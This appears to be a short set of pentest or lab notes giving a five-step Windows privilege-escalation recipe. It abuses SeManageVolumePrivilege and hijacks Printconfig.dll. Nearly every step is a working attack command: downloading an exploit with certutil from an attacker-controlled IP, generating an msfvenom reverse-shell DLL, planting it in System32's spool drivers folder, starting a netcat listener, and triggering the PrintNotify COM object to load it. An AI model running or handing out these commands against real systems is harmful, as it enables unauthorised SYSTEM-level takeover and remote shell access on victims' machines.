1. Download and Run SeManageVolumeExploit.exe (https://github.com/CsEnox/SeManageVolumeExploit)
```bash
certutil -urlcache -f http://192.168.45.175/SeManageVolumeExploit.exe SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
```

2. Create malicious Printconfig.dll file and transfer to victim machine
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.208 LPORT=80 -f dll > Printconfig.dll
certutil -urlcache -f http://192.168.45.175/Printconfig.dll Printconfig.dll
```

3. Move Printconfig.dll to "C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll"
```bash
move .\Printconfig.dll "C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll"
```

4. Run netcat
```bash
nc -nvlp 80
```

5. Initiate the PrintNotify object by executing the following PowerShell commands:
```bash
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```
